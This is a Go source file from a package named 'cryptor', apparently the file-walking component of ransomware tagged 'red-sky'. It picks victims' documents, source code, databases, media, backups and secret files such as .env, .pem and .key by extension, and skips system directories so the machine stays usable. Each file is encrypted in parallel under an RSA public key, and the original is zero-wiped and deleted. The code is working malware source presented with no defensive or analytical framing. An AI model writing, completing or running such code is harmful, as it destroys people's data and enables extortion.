package cryptor

import (
	"crypto/rsa"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// WalkerOptions controls a walker run.
type WalkerOptions struct {
	Root        string // directory to walk
	MaxSize     int64  // skip files larger than this (bytes); 0 = 64MB
	WorkerCount int    // parallel encryptors; default 4
	XDevOK      bool   // cross filesystem boundaries
	DryRun      bool   // enumerate only, write nothing
	WipeOrig    bool   // overwrite original with zeros before unlink
	// OnHit is called per file as it is found (pre-encryption). If nil, no callback.
	OnHit func(path string, size int64)
	// OnDone is called after every file with (ok, err). If nil, no callback.
	OnDone func(path string, ok bool, err error)
}

// WalkerStats is the summary of a walker run.
type WalkerStats struct {
	Found     int64
	Encrypted int64
	Failed    int64
	BytesIn   int64
	BytesOut  int64
	Elapsed   time.Duration
}

// targetExts is the file-extension allow list. Lowercase, dot-prefixed.
var targetExts = map[string]struct{}{
	// documents
	".doc": {}, ".docx": {}, ".docm": {}, ".xls": {}, ".xlsx": {}, ".xlsm": {},
	".ppt": {}, ".pptx": {}, ".pptm": {}, ".pdf": {}, ".rtf": {}, ".odt": {},
	".ods": {}, ".odp": {}, ".txt": {}, ".md": {}, ".csv": {},
	// code
	".c": {}, ".cc": {}, ".cpp": {}, ".h": {}, ".hpp": {}, ".cs": {}, ".java": {},
	".kt": {}, ".go": {}, ".rs": {}, ".py": {}, ".rb": {}, ".php": {}, ".js": {},
	".ts": {}, ".jsx": {}, ".tsx": {}, ".vue": {}, ".sh": {}, ".ps1": {}, ".bat": {},
	".cmd": {}, ".sql": {}, ".pl": {}, ".lua": {},
	// archives
	".zip": {}, ".rar": {}, ".7z": {}, ".tar": {}, ".gz": {}, ".bz2": {}, ".xz": {},
	".tgz": {},
	// databases
	".db": {}, ".sqlite": {}, ".sqlite3": {}, ".mdb": {}, ".accdb": {}, ".dbf": {},
	// images
	".jpg": {}, ".jpeg": {}, ".png": {}, ".gif": {}, ".bmp": {}, ".tif": {},
	".tiff": {}, ".webp": {}, ".heic": {}, ".raw": {},
	// media
	".mp4": {}, ".mov": {}, ".avi": {}, ".mkv": {}, ".wmv": {}, ".flv": {},
	".webm": {}, ".mp3": {}, ".wav": {}, ".flac": {}, ".aac": {}, ".ogg": {},
	".m4a": {},
	// design
	".psd": {}, ".ai": {}, ".xd": {}, ".sketch": {}, ".fig": {}, ".dwg": {},
	".dxf": {}, ".step": {}, ".stp": {}, ".iges": {}, ".igs": {},
	// config / secrets
	".env": {}, ".cfg": {}, ".conf": {}, ".ini": {}, ".yaml": {}, ".yml": {},
	".json": {}, ".xml": {}, ".toml": {}, ".pem": {}, ".key": {}, ".crt": {},
	".pfx": {}, ".p12": {},
	// backups
	".bak": {}, ".backup": {}, ".old": {}, ".orig": {}, ".save": {},
}

// skipDirs is the directory basename block list. Case-insensitive.
var skipDirs = map[string]struct{}{
	// windows
	"windows": {}, "system32": {}, "syswow64": {}, "winsxs": {}, "servicing": {},
	"boot": {}, "recovery": {}, "perflogs": {}, "$recycle.bin": {},
	"system volume information": {}, "config.msi": {}, "msocache": {},
	"$windows.~bt": {}, "$windows.~ws": {},
	// program files
	"program files": {}, "program files (x86)": {}, "programdata": {},
	"microsoft": {}, "windowsapps": {}, "windows defender": {},
	// unix system
	"proc": {}, "sys": {}, "dev": {}, "run": {}, "snap": {}, "lib": {}, "lib64": {},
	"usr": {}, "bin": {}, "sbin": {}, "etc": {}, "var": {},
	// build / vcs
	".git": {}, ".svn": {}, ".hg": {}, ".docker": {}, "node_modules": {},
	"vendor": {}, "target": {}, "build": {}, "dist": {}, "out": {},
	".cache": {}, ".npm": {}, ".cargo": {}, "__pycache__": {}, ".venv": {},
	"venv": {}, ".tox": {}, ".mypy_cache": {},
	// our own
	"red-sky": {}, "output": {},
}

func shouldSkipDir(name string, override map[string]struct{}) bool {
	low := strings.ToLower(name)
	if _, ok := override[low]; ok {
		return true
	}
	if _, ok := skipDirs[low]; ok {
		return true
	}
	// dotdirs
	if strings.HasPrefix(name, ".") {
		return true
	}
	return false
}

func isTargetExt(name string, override map[string]struct{}) bool {
	ext := strings.ToLower(filepath.Ext(name))
	if ext == "" {
		return false
	}
	// caller-supplied override takes precedence
	if override != nil {
		if _, ok := override[ext]; ok {
			return true
		}
	}
	// fall back to the built-in target set
	_, ok := targetExts[ext]
	return ok
}

// Walk walks opts.Root, encrypting every file whose extension is in the
// target list. Returns stats or an error if the root itself is unreadable.
//
// Walk is idempotent — files that already carry the .rsky magic are skipped.
// Symlinks, sockets, and devices are ignored.
func Walk(opts WalkerOptions, pub *rsa.PublicKey, keyID uint32) (WalkerStats, error) {
	var stats WalkerStats
	start := time.Now()
	defer func() { stats.Elapsed = time.Since(start) }()

	if opts.Root == "" {
		return stats, errors.New("walker: root required")
	}
	rootInfo, err := os.Stat(opts.Root)
	if err != nil {
		return stats, fmt.Errorf("walker: root stat: %w", err)
	}
	if !rootInfo.IsDir() {
		return stats, errors.New("walker: root must be a directory")
	}
	if opts.MaxSize == 0 {
		opts.MaxSize = 64 * 1024 * 1024
	}
	if opts.WorkerCount <= 0 {
		opts.WorkerCount = 4
	}

	// collect candidates first, then fan out. this bounds memory and makes
	// the dry-run path trivial (print and return).
	type job struct {
		path string
		size int64
	}
	jobs := make(chan job, opts.WorkerCount*4)

	var (
		wg      sync.WaitGroup
		found   int64
		enc     int64
		fail    int64
		bytesIn int64
		bytesUp int64
	)

	// consumers
	for i := 0; i < opts.WorkerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				if opts.DryRun {
					if opts.OnDone != nil {
						opts.OnDone(j.path, true, nil)
					}
					continue
				}
				in, out, err := EncryptFile(j.path, pub, keyID)
				if err != nil {
					atomic.AddInt64(&fail, 1)
					if opts.OnDone != nil {
						opts.OnDone(j.path, false, err)
					}
					continue
				}
				atomic.AddInt64(&enc, 1)
				atomic.AddInt64(&bytesIn, int64(in))
				atomic.AddInt64(&bytesUp, int64(out))
				if opts.WipeOrig {
					wipeFile(j.path, in)
				}
				if err := os.Remove(j.path); err != nil {
					// log but don't count as failure — the ciphertext is safe
					_ = err
				}
				if opts.OnDone != nil {
					opts.OnDone(j.path, true, nil)
				}
			}
		}()
	}

	// producer
	walkErr := filepath.WalkDir(opts.Root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // skip unreadable entries silently
		}
		if d.IsDir() {
			if path == opts.Root {
				return nil
			}
			if shouldSkipDir(d.Name(), nil) {
				return filepath.SkipDir
			}
			return nil
		}
		info, err := d.Info()
		if err != nil {
			return nil
		}
		// not a regular file (device, socket, pipe)
		if !info.Mode().IsRegular() {
			return nil
		}
		if info.Size() == 0 || info.Size() > opts.MaxSize {
			return nil
		}
		if !isTargetExt(d.Name(), nil) {
			return nil
		}
		// idempotency check
		f, err := os.Open(path)
		if err != nil {
			return nil
		}
		head := make([]byte, len(Magic))
		n, _ := f.Read(head)
		f.Close()
		if n == len(Magic) && string(head) == string(Magic) {
			return nil
		}

		atomic.AddInt64(&found, 1)
		if opts.OnHit != nil {
			opts.OnHit(path, info.Size())
		}
		jobs <- job{path: path, size: info.Size()}
		return nil
	})

	close(jobs)
	wg.Wait()

	stats.Found = found
	stats.Encrypted = enc
	stats.Failed = fail
	stats.BytesIn = bytesIn
	stats.BytesOut = bytesUp
	return stats, walkErr
}

// wipeFile overwrites the first 64 MiB of the file at path with zeros,
// fsyncs, then returns. Best-effort — journaled filesystems will still
// retain the old data in their own log.
func wipeFile(path string, size int) {
	cap := size
	if cap > 64*1024*1024 {
		cap = 64 * 1024 * 1024
	}
	if cap <= 0 {
		return
	}
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer f.Close()
	zero := make([]byte, 4096)
	for written := 0; written < cap; {
		n := cap - written
		if n > len(zero) {
			n = len(zero)
		}
		if _, err := f.Write(zero[:n]); err != nil {
			break
		}
		written += n
	}
	_ = f.Sync()
}
